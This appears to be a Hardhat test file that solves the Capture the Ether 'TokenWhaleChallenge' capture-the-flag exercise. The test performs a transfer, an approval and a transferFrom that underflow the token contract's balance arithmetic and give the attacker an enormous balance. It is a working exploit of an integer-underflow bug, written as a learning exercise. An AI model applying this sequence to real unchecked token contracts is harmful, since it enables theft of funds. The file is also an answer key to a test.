const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = ethers;
const helpers = require("@nomicfoundation/hardhat-network-helpers");

/*
  1.deploy, player1 --> 1000 tokens
  2.transfer() 600 tokens from player1 to player2
  3.approve() 600 tokens from player2 to player1
  4.player1 call --> transferFrom(from player2, to player3, 600 tokens)
  5.underflow in _transfer --> balanceOf[player1] (500 tokens - 600 tokens = underflow)
 */

describe("TokenWhaleChallenge", function () {
  async function deployOneYearLockFixture() {
    const [player1, player2, player3] = await ethers.getSigners();

    //1. deploy TokenWhale Contract
    const TokenWhaleChallenge = await ethers.getContractFactory(
      "TokenWhaleChallenge"
    );
    const contractTokenWhale = await TokenWhaleChallenge.deploy(
      player1.address
    );
    await contractTokenWhale.deployed();

    return { contractTokenWhale, player1, player2, player3 };
  }

  it("Player1 has 1000 tokens", async () => {
    const { contractTokenWhale, player1 } = await loadFixture(
      deployOneYearLockFixture
    );

    const balancePlayer1 = await contractTokenWhale.balanceOf(player1.address);
    expect(balancePlayer1).to.be.equal(1000);
  });

  it("Setup and attack", async () => {
    const { contractTokenWhale, player1, player2, player3 } = await loadFixture(
      deployOneYearLockFixture
    );

    //2.transfer() 600 tokens from player1 to player2
    const transferTx1 = await contractTokenWhale
      .connect(player1)
      .transfer(player2.address, 600);
    await transferTx1.wait();

    //3. Approve() 600 tokens from player2 to player1
    const approveTx = await contractTokenWhale
      .connect(player2)
      .approve(player1.address, 600);
    await approveTx.wait();

    //4. player1 call --> transferFrom(from player2, to player3, 600 tokens)
    const underflowTx = await contractTokenWhale
      .connect(player1)
      .transferFrom(player2.address, player3.address, 600);
    await underflowTx.wait();

    //5. isComplete() ?
    const win = await contractTokenWhale.isComplete();
    expect(win).to.be.equal(true);
  });
});
